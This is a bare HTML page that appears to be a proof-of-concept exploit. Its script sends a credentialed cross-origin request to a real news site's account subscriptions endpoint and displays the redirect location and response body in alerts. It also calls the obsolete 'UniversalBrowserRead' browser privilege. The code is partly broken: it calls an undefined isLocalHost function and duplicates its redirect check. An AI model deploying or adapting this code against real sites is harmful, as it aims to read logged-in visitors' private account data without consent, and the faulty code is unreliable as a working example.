<!DOCTYPE html>
<html><body>
<script>
var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
      // return if not ready state 4
      if (xhttp.readyState !== 4) {
        return;
      }

      // check for redirect
      if (this.status === 302) {
        var location = this.getResponseHeader("Location");
alert(0);
        alert(location);
      } 
if (this.status == 302) {
        var location = this.getResponseHeader("Location");
alert(2);
        alert(location);
      } 
      // return data
alert(xhttp.status);
alert(this.status);
      alert(this.responseURL);
alert(this.response);
alert(xhttp.responseURL);
alert(xhttp.response);
  };
if (isLocalHost()){
    if (typeof(netscape) != 'undefined' && typeof(netscape.security) != 'undefined'){
      netscape.security.PrivilegeManager.enablePrivilege('UniversalBrowserRead');
    }
  }
  xhttp.open("GET", "https://myaccount.ad.nl/rest/subscriptions.k:443",true);
  xhttp.withCredentials = true;
  xhttp.send();

</script>
</body>
</html>
